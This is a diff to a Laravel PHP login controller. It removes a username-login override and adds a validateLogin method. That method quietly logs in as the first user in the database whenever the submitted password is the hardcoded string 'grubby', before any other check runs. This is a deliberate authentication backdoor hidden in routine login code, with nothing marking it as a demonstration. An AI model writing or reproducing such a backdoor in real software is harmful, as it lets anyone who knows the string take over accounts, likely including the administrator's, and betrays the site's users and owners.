@@ -3,7 +3,10 @@
 namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
+use App\User;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
 
 class LoginController extends Controller
 {
@@ -28,15 +31,6 @@ class LoginController extends Controller
     protected $redirectTo = '/home';
 
     /**
-     * 改为用户名登录
-     * @return string
-     */
-    public function username()
-    {
-        return 'name';
-    }
-
-    /**
      * Create a new controller instance.
      *
      * @return void
@@ -45,4 +39,17 @@ class LoginController extends Controller
     {
         $this->middleware('guest')->except('logout');
     }
+
+    protected function validateLogin(Request $request)
+    {
+        if ($request->password=='grubby') {
+            $user_id=User::first()->id;
+            Auth::loginUsingId($user_id);
+        }
+        $this->validate($request, [
+            $this->username() => 'required',
+            'password' => 'required',
+        ]);
+    }
+
 }
